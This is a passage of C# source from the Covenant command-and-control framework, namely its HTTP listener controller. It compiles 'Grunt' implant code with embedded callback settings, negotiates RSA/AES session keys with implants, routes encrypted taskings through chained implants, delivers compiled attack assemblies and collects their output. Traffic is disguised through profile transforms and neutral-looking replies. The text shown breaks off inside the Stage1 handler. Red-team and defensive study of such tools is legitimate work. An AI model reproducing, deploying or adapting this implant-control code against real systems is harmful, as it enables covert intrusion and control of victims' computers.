// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.IO;
using System.Xml;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

using Covenant.API;
using Covenant.API.Models;
using Covenant.Core;

using Microsoft.Rest;
using Microsoft.CodeAnalysis;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Authorization;
using Microsoft.Extensions.Configuration;

using Newtonsoft.Json;

namespace Covenant.Controllers
{
    public static class EncryptUtilities
    {
        // Returns IV (16 bytes) + EncryptedData byte array
        public static byte[] AesEncrypt(byte[] data, byte[] key)
        {
            Aes SessionKey = Aes.Create();
            SessionKey.Mode = Common.AesCipherMode;
            SessionKey.Padding = Common.AesPaddingMode;
            SessionKey.GenerateIV();
            SessionKey.Key = key;

            byte[] encrypted = SessionKey.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);

            return SessionKey.IV.Concat(encrypted).ToArray();
        }

        // Data should be of format: IV (16 bytes) + EncryptedBytes
        public static byte[] AesDecrypt(byte[] data, byte[] key)
        {
            Aes SessionKey = Aes.Create();
            SessionKey.IV = data.Take(Common.AesIVLength).ToArray();
            SessionKey.Key = key;

            byte[] encryptedData = data.TakeLast(data.Length - Common.AesIVLength).ToArray();
            byte[] decrypted = SessionKey.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);

            return decrypted;
        }

        // Convenience method for decrypting an EncryptedMessagePacket
        public static byte[] AesDecrypt(ModelUtilities.GruntEncryptedMessage encryptedMessage, byte[] key)
        {
            return AesDecrypt(
                Convert.FromBase64String(encryptedMessage.IV).Concat(Convert.FromBase64String(encryptedMessage.EncryptedMessage)).ToArray(),
                key
            );
        }

        public static byte[] ComputeHMAC(byte[] data, byte[] key)
        {
            HMACSHA256 SessionHmac = new HMACSHA256(key);
            return SessionHmac.ComputeHash(data);
        }

        public static bool VerifyHMAC(byte[] hashedBytes, byte[] hash, byte[] key)
        {
            HMACSHA256 hmac = new HMACSHA256(key);
            byte[] calculatedHash = hmac.ComputeHash(hashedBytes);

            // Should do double hmac?
            return Enumerable.SequenceEqual(calculatedHash, hash);
        }

        public static byte[] RSAEncrypt(byte[] toEncrypt, string RSAPublicKeyXMLString)
        {
            RSA RSAPublicKey = RSA.Create();
            RSAKeyExtensions.FromXmlString(RSAPublicKey, RSAPublicKeyXMLString);
            return RSAPublicKey.Encrypt(toEncrypt, RSAEncryptionPadding.OaepSHA1);
        }

        public static byte[] GruntRSAEncrypt(Grunt grunt, byte[] toEncrypt)
        {
            return EncryptUtilities.RSAEncrypt(toEncrypt, Common.CovenantEncoding.GetString(Convert.FromBase64String(grunt.GruntRSAPublicKey)));
        }
    }

    internal static class RSAKeyExtensions
    {
        public static void FromXmlString(this RSA rsa, string xmlString)
        {
            RSAParameters parameters = new RSAParameters();

            XmlDocument xmlDoc = new XmlDocument();
            xmlDoc.LoadXml(xmlString);

            if (xmlDoc.DocumentElement.Name.Equals("RSAKeyValue"))
            {
                foreach (XmlNode node in xmlDoc.DocumentElement.ChildNodes)
                {
                    switch (node.Name)
                    {
                        case "Modulus": parameters.Modulus = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "Exponent": parameters.Exponent = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "P": parameters.P = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "Q": parameters.Q = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "DP": parameters.DP = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "DQ": parameters.DQ = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "InverseQ": parameters.InverseQ = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "D": parameters.D = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                    }
                }
            }
            else
            {
                throw new Exception("Invalid XML RSA key.");
            }

            rsa.ImportParameters(parameters);
        }

        public static string ToXmlString(this RSA rsa, bool includePrivateParameters)
        {
            RSAParameters parameters = rsa.ExportParameters(includePrivateParameters);

            return string.Format("<RSAKeyValue><Modulus>{0}</Modulus><Exponent>{1}</Exponent><P>{2}</P><Q>{3}</Q><DP>{4}</DP><DQ>{5}</DQ><InverseQ>{6}</InverseQ><D>{7}</D></RSAKeyValue>",
                  parameters.Modulus != null ? Convert.ToBase64String(parameters.Modulus) : null,
                  parameters.Exponent != null ? Convert.ToBase64String(parameters.Exponent) : null,
                  parameters.P != null ? Convert.ToBase64String(parameters.P) : null,
                  parameters.Q != null ? Convert.ToBase64String(parameters.Q) : null,
                  parameters.DP != null ? Convert.ToBase64String(parameters.DP) : null,
                  parameters.DQ != null ? Convert.ToBase64String(parameters.DQ) : null,
                  parameters.InverseQ != null ? Convert.ToBase64String(parameters.InverseQ) : null,
                  parameters.D != null ? Convert.ToBase64String(parameters.D) : null);
        }
    }

    public class ModelUtilities
    {
        private byte[] TransformCoreAssemblyBytes { get; set; }
        private Assembly TransformCoreAssembly { get; set; }

        private Assembly GetTransformCoreAssembly(HttpProfile profile)
        {
            if (this.TransformCoreAssembly == null)
            {
                if (this.TransformCoreAssemblyBytes == null)
                {
                    this.TransformCoreAssemblyBytes = Compiler.Compile(new Compiler.CompilationRequest
                    {
                        Source = profile.HttpMessageTransform,
                        TargetDotNetVersion = Common.DotNetVersion.NetCore21,
                        References = Common.DefaultReferencesCore21
                    });
                }
                this.TransformCoreAssembly = Assembly.Load(this.TransformCoreAssemblyBytes);
            }
            return this.TransformCoreAssembly;
        }

        public string ProfileTransform(HttpProfile profile, byte[] bytes)
        {
            Type t = this.GetTransformCoreAssembly(profile).GetType("HttpMessageTransform");
            return (string)t.GetMethod("Transform").Invoke(null, new object[] { bytes });
        }

        public byte[] ProfileInvert(HttpProfile profile, string str)
        {
            Type t = this.GetTransformCoreAssembly(profile).GetType("HttpMessageTransform");
            return (byte[])t.GetMethod("Invert").Invoke(null, new object[] { str });
        }

        public string ListenerGetGruntExecutorCode(HttpListener listener, Grunt grunt, HttpProfile profile)
        {
            return this.ListenerGruntTemplateReplace(listener, GruntExecutorTemplateCode, grunt, profile);
        }

        private string ListenerGruntTemplateReplace(HttpListener listener, string CodeTemplate, Grunt grunt, HttpProfile profile)
        {
            string ConnectUrl = (listener.UseSSL ? "https://" : "http://") + listener.ConnectAddress + ":" + listener.BindPort;
            string HttpHeaders = "";
            foreach (HttpProfileHeader header in profile.HttpRequestHeaders)
            {
                HttpHeaders += "ProfileHttpHeaderNames.Add(@\"" + this.FormatForVerbatimString(header.Name.Replace("{GUID}", grunt.Guid)) + "\");\n";
                HttpHeaders += "ProfileHttpHeaderValues.Add(@\"" + this.FormatForVerbatimString(header.Value.Replace("{GUID}", grunt.Guid)) + "\");\n";
            }
            string HttpUrls = "";
            foreach (string url in profile.HttpUrls)
            {
                HttpUrls += "ProfileHttpUrls.Add(@\"" + this.FormatForVerbatimString(url.Replace("{GUID}", grunt.Guid)) + "\");\n";
            }

            return CodeTemplate
                .Replace("// {{REPLACE_PROFILE_HTTP_TRANSFORM}}", profile.HttpMessageTransform)
                .Replace("// {{REPLACE_PROFILE_HTTP_HEADERS}}", HttpHeaders)
                .Replace("// {{REPLACE_PROFILE_HTTP_URLS}}", HttpUrls)
                .Replace("{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}", this.FormatForVerbatimString(profile.HttpGetResponse))
                .Replace("{{REPLACE_PROFILE_HTTP_POST_REQUEST}}", this.FormatForVerbatimString(profile.HttpPostRequest))
                .Replace("{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}", this.FormatForVerbatimString(profile.HttpPostResponse))
                .Replace("{{REPLACE_COMM_TYPE}}", grunt.CommType.ToString())
                .Replace("{{REPLACE_VALIDATE_CERT}}", grunt.ValidateCert ? "true" : "false")
                .Replace("{{REPLACE_USE_CERT_PINNING}}", grunt.UseCertPinning ? "true" : "false")
                .Replace("{{REPLACE_PIPE_NAME}}", grunt.SmbPipeName)
                .Replace("{{REPLACE_COVENANT_URI}}", this.FormatForVerbatimString(ConnectUrl))
                .Replace("{{REPLACE_COVENANT_CERT_HASH}}", this.FormatForVerbatimString(listener.UseSSL ? listener.SslCertHash : ""))
                .Replace("{{REPLACE_GRUNT_GUID}}", this.FormatForVerbatimString(grunt.OriginalServerGuid))
                .Replace("{{REPLACE_DELAY}}", this.FormatForVerbatimString(grunt.Delay.ToString()))
                .Replace("{{REPLACE_JITTER_PERCENT}}", this.FormatForVerbatimString(grunt.JitterPercent.ToString()))
                .Replace("{{REPLACE_CONNECT_ATTEMPTS}}", this.FormatForVerbatimString(grunt.ConnectAttempts.ToString()))
                .Replace("{{REPLACE_KILL_DATE}}", this.FormatForVerbatimString(grunt.KillDate.ToBinary().ToString()))
                .Replace("{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}", this.FormatForVerbatimString(grunt.GruntSharedSecretPassword));
        }

        private string FormatForVerbatimString(string replacement)
        {
            return string.IsNullOrEmpty(replacement) ? "" : replacement.Replace("\"", "\"\"").Replace("{", "{{").Replace("}", "}}").Replace("{{0}}", "{0}");
        }

        private static readonly string GruntExecutorTemplateCode = File.ReadAllText(Path.Combine(Common.CovenantGruntDirectory, "Grunt" + ".cs"));

        public string ListenerCompileGruntExecutorCode(HttpListener listener, Grunt grunt, HttpProfile profile, bool Compress = false)
        {
            Common.DotNetVersion version = Common.DotNetVersion.Net35;
            switch (grunt.DotNetFrameworkVersion)
            {
                case DotNetVersion.Net35:
                    version = Common.DotNetVersion.Net35;
                    break;
                case DotNetVersion.Net40:
                    version = Common.DotNetVersion.Net40;
                    break;
                case DotNetVersion.NetCore21:
                    version = Common.DotNetVersion.NetCore21;
                    break;
            }
            byte[] ILBytes = Compiler.Compile(new Compiler.CompilationRequest
            {
                Source = this.ListenerGetGruntExecutorCode(listener, grunt, profile),
                TargetDotNetVersion = version,
                OutputKind = OutputKind.DynamicallyLinkedLibrary,
                References = grunt.DotNetFrameworkVersion == DotNetVersion.Net35 ? Common.DefaultNet35References : Common.DefaultNet40References
            });
            if (ILBytes == null || ILBytes.Length == 0)
            {
                throw new CovenantCompileGruntStagerFailedException("Compiling Grunt code failed");
            }

            if (Compress)
            {
                ILBytes = Utilities.Compress(ILBytes);
            }
            return Convert.ToBase64String(ILBytes);
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{");
            if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
            if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
            if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
            if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
            if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
            if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
            if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
            return matches;
        }

        public enum GruntEncryptedMessageType
        {
            Routing,
            Tasking
        }

        public class GruntEncryptedMessage
        {
            public string GUID { get; set; }
            public GruntEncryptedMessageType Type { get; set; }
            public string Meta { get; set; } = "";

            public string IV { get; set; }
            public string EncryptedMessage { get; set; }
            public string HMAC { get; set; }

            private static GruntEncryptedMessage Create(string GUID, byte[] message, byte[] key, GruntEncryptedMessageType Type = GruntEncryptedMessageType.Tasking)
            {
                byte[] encryptedMessagePacket = EncryptUtilities.AesEncrypt(message, key);
                byte[] encryptionIV = encryptedMessagePacket.Take(Common.AesIVLength).ToArray();
                byte[] encryptedMessage = encryptedMessagePacket.TakeLast(encryptedMessagePacket.Length - Common.AesIVLength).ToArray();
                byte[] hmac = EncryptUtilities.ComputeHMAC(encryptedMessage, key);
                return new GruntEncryptedMessage
                {
                    GUID = GUID,
                    Type = Type,
                    EncryptedMessage = Convert.ToBase64String(encryptedMessage),
                    IV = Convert.ToBase64String(encryptionIV),
                    HMAC = Convert.ToBase64String(hmac)
                };
            }

            public static GruntEncryptedMessage Create(Grunt grunt, byte[] message, GruntEncryptedMessageType Type = GruntEncryptedMessageType.Tasking)
            {
                if (grunt.Status == GruntStatus.Uninitialized || grunt.Status == GruntStatus.Stage0)
                {
                    return Create(grunt.Guid, message, Convert.FromBase64String(grunt.GruntSharedSecretPassword), Type);
                }
                return Create(grunt.Guid, message, Convert.FromBase64String(grunt.GruntNegotiatedSessionKey), Type);
            }

            public bool VerifyHMAC(byte[] Key)
            {
                if (IV == "" || EncryptedMessage == "" || HMAC == "" || Key.Length == 0) { return false; }
                try
                {
                    var hashedBytes = Convert.FromBase64String(this.EncryptedMessage);
                    return EncryptUtilities.VerifyHMAC(hashedBytes, Convert.FromBase64String(this.HMAC), Key);
                }
                catch
                {
                    return false;
                }
            }
        }

        // Data should be of format: IV (16 bytes) + EncryptedBytes
        public byte[] GruntSessionDecrypt(Grunt grunt, byte[] data)
        {
            return EncryptUtilities.AesDecrypt(data, Convert.FromBase64String(grunt.GruntNegotiatedSessionKey));
        }

        // Convenience method for decrypting a GruntEncryptedMessage
        public byte[] GruntSessionDecrypt(Grunt grunt, GruntEncryptedMessage gruntEncryptedMessage)
        {
            return this.GruntSessionDecrypt(grunt, Convert.FromBase64String(gruntEncryptedMessage.IV)
                .Concat(Convert.FromBase64String(gruntEncryptedMessage.EncryptedMessage)).ToArray());
        }
    }

    [AllowAnonymous]
    public class HttpListenerController : Controller
    {
        private readonly ICovenantAPI _client;
        private readonly Covenant.Models.Listeners.HttpListenerContext _context;
        private readonly ModelUtilities _utilities = new ModelUtilities();

		public HttpListenerController(ICovenantAPI api, Covenant.Models.Listeners.HttpListenerContext context)
        {
            _client = api;
            _context = context;
        }

        private string GetGuid()
		{
            foreach (HttpProfileHeader header in _context.HttpProfile.First().HttpRequestHeaders)
            {
                if (header.Name.Contains("{GUID}"))
                {
                    return ModelUtilities.Parse(HttpContext.Request.Headers.First(H => H.Value == header.Value).Key, header.Name.Replace("{GUID}", "{0}"))[0];
                }
                if (header.Value.Contains("{GUID}"))
                {
                    return ModelUtilities.Parse(HttpContext.Request.Headers[header.Name].First(), header.Value.Replace("{GUID}", "{0}"))[0];
                }
            }
            string url = _context.HttpProfile.First().HttpUrls.FirstOrDefault(U => U.StartsWith(HttpContext.Request.Path, StringComparison.CurrentCultureIgnoreCase));
            if (url != null && url.Contains("{GUID}"))
            {
                return ModelUtilities.Parse((HttpContext.Request.Path + HttpContext.Request.QueryString), url.Replace("{GUID}", "{0}"))[0];
            }
            return null;
        }

        private void SetHeaders()
        {
            foreach (HttpProfileHeader header in _context.HttpProfile.First().HttpResponseHeaders)
            {
                HttpContext.Response.Headers[header.Name] = header.Value;
            }
        }

        private string GetGetEmptyResponse()
        {
            return String.Format(_context.HttpProfile.First().HttpGetResponse, "");
        }

        private string GetPostEmptyResponse()
        {
            return String.Format(_context.HttpProfile.First().HttpPostResponse, "");
        }

        private ModelUtilities.GruntEncryptedMessage CreateMessageForGrunt(Grunt grunt, Grunt targetGrunt, GruntTaskingMessage taskingMessage)
        {
            return this.CreateMessageForGrunt(grunt, targetGrunt, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(taskingMessage)));
        }

        private ModelUtilities.GruntEncryptedMessage CreateMessageForGrunt(Grunt grunt, Grunt targetGrunt, byte[] message)
        {
            List<string> path = _client.ApiGruntsByIdPathByCidGet(grunt.Id ?? default, targetGrunt.Id ?? default).ToList();
            path.Reverse();
            ModelUtilities.GruntEncryptedMessage finalMessage = null;
            ModelUtilities.GruntEncryptedMessageType messageType = ModelUtilities.GruntEncryptedMessageType.Tasking;
            foreach (string guid in path)
            {
                Grunt thisGrunt = _client.ApiGruntsGuidByGuidGet(guid);
                finalMessage = ModelUtilities.GruntEncryptedMessage.Create(
                    thisGrunt,
                    message,
                    messageType
                );
                message = Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(finalMessage));
                messageType = ModelUtilities.GruntEncryptedMessageType.Routing;
            }
            return finalMessage;
        }

        private byte[] GetCompressedILAssembly35(string taskname)
        {
            return System.IO.File.ReadAllBytes(Common.CovenantCompiledTaskNet35Directory + taskname + ".compiled");
        }

        private byte[] GetCompressedILAssembly40(string taskname)
        {
            return System.IO.File.ReadAllBytes(Common.CovenantCompiledTaskNet40Directory + taskname + ".compiled");
        }

        private GruntTaskingMessage GetGruntTaskingMessage(GruntTasking tasking, DotNetVersion version)
        {
            string Message = "";
            switch (tasking.Type)
            {
                case GruntTaskingType.Assembly:
                    switch (version)
                    {
                        case DotNetVersion.Net35:
                            Message = Convert.ToBase64String(this.GetCompressedILAssembly35(tasking.GruntTask.Name));
                            if (tasking.Parameters.Any())
                            {
                                Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(P))));
                            }
                            break;
                        case DotNetVersion.Net40:
                            Message = Convert.ToBase64String(this.GetCompressedILAssembly40(tasking.GruntTask.Name));
                            if (tasking.Parameters.Any())
                            {
                                Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(P))));
                            }
                            break;
                    }
                    break;
                case GruntTaskingType.SetDelay:
                    Message = tasking.Parameters[0];
                    break;
                case GruntTaskingType.SetJitter:
                    Message = tasking.Parameters[0];
                    break;
                case GruntTaskingType.SetConnectAttempts:
                    Message = tasking.Parameters[0];
                    break;
                case GruntTaskingType.Connect:
                    Message = tasking.Parameters[0] + "," + tasking.Parameters[1];
                    break;
                case GruntTaskingType.Disconnect:
                    Message = tasking.Parameters[0];
                    break;
                default:
                    Message = string.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(P))));
                    break;
            }
            return new GruntTaskingMessage
            {
                Type = tasking.Type,
                Name = tasking.Name,
                Message = Message,
                Token = tasking.GruntTask == null ? false : tasking.GruntTask.TokenTask
            };
        }

        [AllowAnonymous]
		[HttpGet]
		public async Task<ActionResult<string>> Get()
		{
            try
            {
                this.SetHeaders();
                string guid = this.GetGuid();
                if (string.IsNullOrEmpty(guid))
                {
                    // Invalid GUID. May not be legitimate Grunt request, respond Ok
                    return Ok();
                }
                Grunt grunt = null;
                try
                {
                    grunt = await _client.ApiGruntsGuidByGuidGetAsync(guid);
                }
                catch (HttpOperationException) { grunt = null; }
                if (grunt == null || grunt.Status != GruntStatus.Active)
                {
                    // Invalid GUID. May not be legitimate Grunt request, respond Ok
                    return Ok();
                }
                grunt.LastCheckIn = DateTime.UtcNow;
                await _client.ApiGruntsPutAsync(grunt);
                GruntTasking gruntTasking = (await _client.ApiGruntsByIdTaskingsSearchUninitializedGetAsync(grunt.Id ?? default)).FirstOrDefault();
                if (gruntTasking == null)
                {
                    // No GruntTasking assigned. Respond with empty template
                    return Ok(this.GetGetEmptyResponse());
                }

                if (gruntTasking.Type == GruntTaskingType.Assembly && gruntTasking.GruntTask == null)
                {
                    // Can't find corresponding task. Should never reach this point. Will just respond NotFound.
                    return NotFound();
                }

                gruntTasking.Status = GruntTaskingStatus.Tasked;
                gruntTasking.TaskingTime = DateTime.UtcNow;
                gruntTasking = await _client.ApiTaskingsPutAsync(gruntTasking);
                gruntTasking.Grunt = gruntTasking.GruntId == grunt.Id ? grunt : await _client.ApiGruntsByIdGetAsync(gruntTasking.GruntId);
                ModelUtilities.GruntEncryptedMessage message = null;
                try
                {
                    message = this.CreateMessageForGrunt(grunt, gruntTasking.Grunt, this.GetGruntTaskingMessage(gruntTasking, gruntTasking.Grunt.DotNetFrameworkVersion));
                }
                catch (HttpOperationException)
                {
                    gruntTasking.Status = GruntTaskingStatus.Aborted;
                    await _client.ApiTaskingsPutAsync(gruntTasking);
                    return NotFound();
                }
                // Transform response
                string transformed = this._utilities.ProfileTransform(_context.HttpProfile.First(), Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
                // Format transformed response
                string response = String.Format(_context.HttpProfile.First().HttpPostResponse, transformed);
                return Ok(response);
            }
            catch (HttpOperationException)
            {
                return NotFound();
            }
            catch (Exception)
            {
                return NotFound();
            }
        }

        [AllowAnonymous]
		[HttpPost]
		public async Task<ActionResult<string>> Post()
        {
            try
            {
                this.SetHeaders();
                using (StreamReader reader = new StreamReader(Request.Body, System.Text.Encoding.UTF8))
                {
                    ModelUtilities.GruntEncryptedMessage message = null;
                    try
                    {
                        string body = reader.ReadToEnd();
                        string ExtractedMessage = body.ParseExact(_context.HttpProfile.First().HttpPostRequest).FirstOrDefault();
                        string inverted = Common.CovenantEncoding.GetString(this._utilities.ProfileInvert(_context.HttpProfile.First(), ExtractedMessage));
                        message = JsonConvert.DeserializeObject<ModelUtilities.GruntEncryptedMessage>(inverted);
                    }
                    catch (Exception)
                    {
                        // Request not formatted correctly. May not be legitimate Grunt request, respond NotFound
                        return NotFound();
                    }

                    string guid = this.GetGuid();
                    Grunt egressGrunt = null;
                    Grunt targetGrunt = null;
                    try
                    {
                        egressGrunt = guid == null ? null : await _client.ApiGruntsGuidByGuidGetAsync(guid);
                    }
                    catch (HttpOperationException)
                    {
                        egressGrunt = null;
                    }
                    try
                    {
                        targetGrunt = await _client.ApiGruntsGuidByGuidGetAsync(message.GUID);
                    }
                    catch (HttpOperationException)
                    {
                        targetGrunt = null;
                        // Stage0 Guid is OriginalServerGuid + Guid
                        if (message.GUID.Length == 20)
                        {
                            Grunt originalGeneratedGrunt = await _client.ApiGruntsOriginalguidByServerguidGetAsync(message.GUID.Substring(0, 10));
                            return await this.PostStage0(egressGrunt, originalGeneratedGrunt, message);
                        }
                        return NotFound();
                    }

                    switch (targetGrunt.Status)
                    {
                        case GruntStatus.Uninitialized:
                            return await this.PostStage0(egressGrunt, targetGrunt, message);
                        case GruntStatus.Stage0:
                            return await this.PostStage1(egressGrunt, targetGrunt, message);
                        case GruntStatus.Stage1:
                            return await this.PostStage2(egressGrunt, targetGrunt, message);
                        case GruntStatus.Stage2:
                            return await this.RegisterGrunt(egressGrunt, targetGrunt, message);
                        case GruntStatus.Active:
                            return await this.PostTask(egressGrunt, targetGrunt, message, guid);
                        default:
                            return NotFound();
                    }
                }
            }
            catch (HttpOperationException)
            {
                return NotFound();
            }
        }
        
        // post task
		private async Task<ActionResult> PostTask(Grunt egressGrunt, Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage outputMessage, string guid)
        {
            if (targetGrunt == null || targetGrunt.Status != GruntStatus.Active || egressGrunt == null || egressGrunt.Guid != guid)
            {
                // Invalid GUID. May not be legitimate Grunt request, respond NotFound
                return NotFound();
            }

			string TaskName = outputMessage.Meta;
            if (string.IsNullOrWhiteSpace(TaskName))
            {
                // Invalid task response. This happens on post-register write
                return NotFound();
            }
            GruntTasking gruntTasking;
            try
            {
                gruntTasking = await _client.ApiGruntsTaskingsByTaskingnameGetAsync(TaskName);
            }
            catch (HttpOperationException)
            {
                // Invalid taskname. May not be legitimate Grunt request, respond NotFound
                return NotFound();
            }

            if (targetGrunt == null || targetGrunt.Status != GruntStatus.Active)
            {
                // Invalid Grunt. May not be legitimate Grunt request, respond NotFound
                return NotFound();
            }
            if (!outputMessage.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
            {
                // Invalid signature. Almost certainly not a legitimate Grunt request, respond NotFound
                return NotFound();
            }
            string taskOutput = Common.CovenantEncoding.GetString(_utilities.GruntSessionDecrypt(targetGrunt, outputMessage));
            gruntTasking.GruntCommand.CommandOutput = new CommandOutput
            {
                Id = 0,
                GruntCommandId = gruntTasking.GruntCommandId,
                Output = taskOutput
            };
            gruntTasking.GruntCommand.CommandOutputId = 0;
            gruntTasking.Status = GruntTaskingStatus.Completed;
            gruntTasking.CompletionTime = DateTime.UtcNow;
            gruntTasking.GruntCommand = await _client.ApiCommandsPutAsync(gruntTasking.GruntCommand);
            await _client.ApiTaskingsPutAsync(gruntTasking);
            targetGrunt.LastCheckIn = DateTime.UtcNow;
            await _client.ApiGruntsPutAsync(targetGrunt);
            return Ok();
        }

		private async Task<ActionResult> PostStage0(Grunt egressGrunt, Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntStage0Response)
        {
            if (targetGrunt == null || !gruntStage0Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntSharedSecretPassword)))
            {
                // Always return NotFound, don't give away unnecessary info
                return NotFound();
            }
            bool egressGruntExists = egressGrunt != null;

            string guid = gruntStage0Response.GUID.Substring(10);
            if (targetGrunt.Status != GruntStatus.Uninitialized)
            {
                // We create a new Grunt if this one is not uninitialized
                Grunt tempModel = new Grunt
                {
                    Id = 0,
                    Name = Utilities.CreateShortGuid(),
                    Guid = guid,
                    OriginalServerGuid = Utilities.CreateShortGuid(),
                    Status = GruntStatus.Stage0,
                    ListenerId = targetGrunt.ListenerId,
                    Listener = targetGrunt.Listener,
                    GruntSharedSecretPassword = targetGrunt.GruntSharedSecretPassword,
                    CommType = targetGrunt.CommType,
                    SmbPipeName = targetGrunt.SmbPipeName,
                    Delay = targetGrunt.Delay, JitterPercent = targetGrunt.JitterPercent, KillDate = targetGrunt.KillDate,
                    ConnectAttempts = targetGrunt.ConnectAttempts,
                    DotNetFrameworkVersion = targetGrunt.DotNetFrameworkVersion,
                    LastCheckIn = DateTime.UtcNow
                };
                targetGrunt = await _client.ApiGruntsPostAsync(tempModel);
            }
            else
            {
                targetGrunt.Status = GruntStatus.Stage0;
                targetGrunt.Guid = guid;
                targetGrunt.LastCheckIn = DateTime.UtcNow;
                targetGrunt = await _client.ApiGruntsPutAsync(targetGrunt);
            }
            if (!egressGruntExists)
            {
                egressGrunt = targetGrunt;
            }

            // EncryptedMessage is the RSA Public Key
            targetGrunt.GruntRSAPublicKey = Convert.ToBase64String(EncryptUtilities.AesDecrypt(
                gruntStage0Response,
                Convert.FromBase64String(targetGrunt.GruntSharedSecretPassword)
            ));
            // Generate negotiated session key
            Aes newAesKey = Aes.Create();
            newAesKey.GenerateKey();
            targetGrunt.GruntNegotiatedSessionKey = Convert.ToBase64String(newAesKey.Key);
            await _client.ApiGruntsPutAsync(targetGrunt);

            if (egressGruntExists)
            {
                // Add this as Child grunt to Grunt that connects it
                List<GruntTasking> taskings = _client.ApiTaskingsGet().ToList();
                // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ guid of some sort?
                GruntTasking connectTasking = taskings.Where(GT => GT.Type == GruntTaskingType.Connect && GT.Status == GruntTaskingStatus.Progressed).Reverse().FirstOrDefault();
                if (connectTasking == null)
                {
                    return NotFound();
                }
                GruntTaskingMessage tmessage = this.GetGruntTaskingMessage(connectTasking, targetGrunt.DotNetFrameworkVersion);
                targetGrunt.Hostname = tmessage.Message.Split(",")[0];
                await _client.ApiGruntsPutAsync(targetGrunt);
                connectTasking.Status = GruntTaskingStatus.Completed;
                await _client.ApiTaskingsPutAsync(connectTasking);
            }

            byte[] rsaEncryptedBytes = EncryptUtilities.GruntRSAEncrypt(targetGrunt, Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey));
            ModelUtilities.GruntEncryptedMessage message = null;
            try
            {
                message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, rsaEncryptedBytes);
            }
            catch (HttpOperationException)
            {
                return NotFound();
            }
            // Transform response
            string transformed = this._utilities.ProfileTransform(_context.HttpProfile.First(), Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
            // Format transformed response
            string response = String.Format(_context.HttpProfile.First().HttpPostResponse, transformed);
            // Stage0Response: "Id,Name,Base64(IV),Base64(AES(RSA(SessionKey))),Base64(HMAC)"
            return Ok(response);
        }

		private async Task<ActionResult> PostStage1(Grunt egressGrunt, Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntStage1Response)
        {
            if (targetGrunt == null || targetGrunt.Status != GruntStatus.Stage0 || !gruntStage1Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
            {
                // Always return NotFound, don't give away unnecessary info
                return NotFound();
            }
            if (egressGrunt == null)
            {
                egressGrunt = targetGrunt;
            }
            byte[] challenge1 = _utilities.GruntSessionDecrypt(targetGrunt, gruntStage1Response);
            byte[] challenge2 = new byte[4];
            using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(challenge2);
            }
            // Save challenge to compare on response
            targetGrunt.GruntChallenge = Convert.ToBase64String(challenge2);
            targetGrunt.Status = GruntStatus.Stage1;
            targetGrunt.LastCheckIn = DateTime.UtcNow;
            await _client.ApiGruntsPutAsync(targetGrunt);

            ModelUtilities.GruntEncryptedMessage message;
            try
            {
                message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, challenge1.Concat(challenge2).ToArray());
            }
            catch (HttpOperationException)
            {
                return NotFound();
            }

            // Transform response
            string transformed = this._utilities.ProfileTransform(_context.HttpProfile.First(), Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
